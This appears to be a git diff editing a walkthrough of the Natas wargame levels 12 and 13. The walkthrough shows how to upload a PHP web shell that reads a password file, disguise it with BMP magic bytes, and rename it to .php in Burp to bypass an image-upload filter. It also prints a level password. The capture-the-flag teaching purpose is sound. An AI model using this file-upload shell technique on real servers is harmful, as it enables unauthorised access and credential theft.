@@ -162,7 +162,7 @@ if(array_key_exists("filename", $_POST)) {
 ?> 
 ```
 
-Okay... file upload. The first thing that I can think of, off the top of my head is an [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). So let's go ahead and text for this vulnerability. We can begin by creating a simple PHP Shell that will echo back the contents of __/etc/natas_webpass/natas13__.
+Okay... file upload. The first thing that I can think of, off the top of my head is an [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload). So let's go ahead and test for this vulnerability. We can begin by creating a simple PHP Shell that will echo back the contents of __/etc/natas_webpass/natas13__.
 
 ```php
 <?
@@ -171,11 +171,11 @@ echo "<pre>$output</pre>";
 ?>
 ```
 
-Once done, save it as __shell.php__. Go back to the website, click __Browse__ and select our shell. Before you click __Upload__ fire up Burp, and set up the Burp Proxy to catch packets. Once done, click __Upload__.
+Once done, save it as __shell.php__. Go back to the website, click __Browse__ and select our shell. BUT! Before you click __Upload__, fire up Burp and set up the Burp Proxy to intercept packets. Once done, click __Upload__.
 
-Looking at the Burps Intercept we can see toward the bottom of the page the following lines:
+Looking at the Burps Intercept we can see towards the bottom of the page the following lines:
 
-```
+```xml
 Content-Disposition: form-data; name="filename"
 
 zvot8u94ri.jpg
@@ -246,7 +246,7 @@ if(array_key_exists("filename", $_POST)) {
 ?> 
 ```
 
-Okay, I'm sure we can exploit this! Let's go ahead edit __shell.php__ from level 12 so that it will be pulling the password for Natas 14 this time. Also, we will be adding BMP to the start of the php file.
+Okay, I'm sure we can exploit this! Let's go ahead and edit __shell.php__ that we used in level 12.This time it has to be pulling the password from Natas14. Also we have to add BMP to the start of the file.
 
 ```php
 BMP<?
@@ -255,11 +255,11 @@ echo "<pre>$output</pre>";
 ?>
 ```
 
-We will be doing a repeat of 12, so Browse for __shell.php__, open it, fire up Burp, start up proxy, and Upload the file!
+We will be doing a repeat of 12, so click __Browse__ and look for __shell.php__, open it, fire up Burp, start up the proxy, and __Upload__ the file!
 
-In Burp's Intercept - you should see something along the following lines:
+In Burp's Intercept we should see something along the following lines:
 
-```
+```xml
 Content-Disposition: form-data; name="filename"
 
 3hwxwqemk3.jpg
@@ -275,7 +275,9 @@ echo "<pre>$output</pre>";
 -----------------------------1625648362953610391147035725--
 ```
 
-Since the server only accepts image files and not our php files, let's change the name __3hwxwqemk3.jpg__ to __shell.php__, and forward the packet. You should now see something along the lines of "__The file upload/w0yzhafetj.php has been uploaded__". Let's go ahead and click the __upload/w0yzhafetj.php__ link. If done correctly we should get the password `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.
+Let's change the name __3hwxwqemk3.jpg__ to __shell.php__, and forward the packet. You should now see something along the lines of "__The file upload/w0yzhafetj.php has been uploaded__". Let's go ahead and click the __upload/w0yzhafetj.php__ link. 
+
+If done correctly we should get the password `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.
 
 Congrats! It was simple enough! I suggest you go read more about [Unrestricted File Uploads](https://www.owasp.org/index.php/Unrestricted_File_Upload) from __OWASP__ as they are an amazing source to learning Web Hacking! We're done here... so moving on to level 14!
 
